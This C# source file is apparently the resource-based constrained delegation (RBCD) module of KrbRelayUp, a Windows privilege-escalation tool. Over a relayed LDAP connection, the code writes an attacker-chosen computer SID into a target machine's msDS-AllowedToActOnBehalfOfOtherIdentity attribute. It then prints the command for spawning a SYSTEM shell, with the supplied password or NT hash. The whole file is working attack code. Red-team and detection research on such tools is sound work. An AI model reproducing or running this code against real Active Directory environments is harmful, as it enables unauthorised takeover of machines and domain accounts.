using System;
using System.Security.AccessControl;
using static KrbRelayUp.Relay.Natives;

namespace KrbRelayUp.Relay.Attacks.Ldap
{
    internal class RBCD
    {
        public static LdapStatus attack(IntPtr ld)
        {
            if (!Options.rbcdComputerSid.StartsWith("S-1-5-"))
            {
                Console.WriteLine($"[-] Computer SID is not valid");
                return LdapStatus.LDAP_UNWILLING_TO_PERFORM;
            }
            string dn = Generic.getMachineDN(ld, Options.targetDN);
            var dacl = "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + Options.rbcdComputerSid + ")";
            RawSecurityDescriptor sd = new RawSecurityDescriptor(dacl);
            byte[] value = new byte[sd.BinaryLength];
            sd.GetBinaryForm(value, 0);
            LdapStatus result = Generic.setAttribute(ld, "msDS-AllowedToActOnBehalfOfOtherIdentity", value, dn);

            if (result == LdapStatus.LDAP_SUCCESS)
            {
                Console.WriteLine("[+] RBCD rights added successfully");
                if (Options.phase != Options.PhaseType.Full)
                {
                    Console.WriteLine("[+] Run the spawn method for SYSTEM shell:");
                    Console.Write($"    ./KrbRelayUp.exe spawn -m rbcd -d {Options.domain} -dc {Options.domainController} -cn {Options.rbcdComputerName}$ ");
                    if (!String.IsNullOrEmpty(Options.rbcdComputerPassword))
                    {
                        Console.WriteLine($"-cp {Options.rbcdComputerPassword}");
                    }
                    else if (!String.IsNullOrEmpty(Options.rbcdComputerPasswordHash))
                    {
                        Console.WriteLine($"-ch {Options.rbcdComputerPasswordHash}");
                    }
                    else
                    {
                        Console.WriteLine("[-cp PASSWORD | -ch NTHASH]");
                    }
                }
                Options.attackDone = true;
            }
            return result;
        }
    }
}
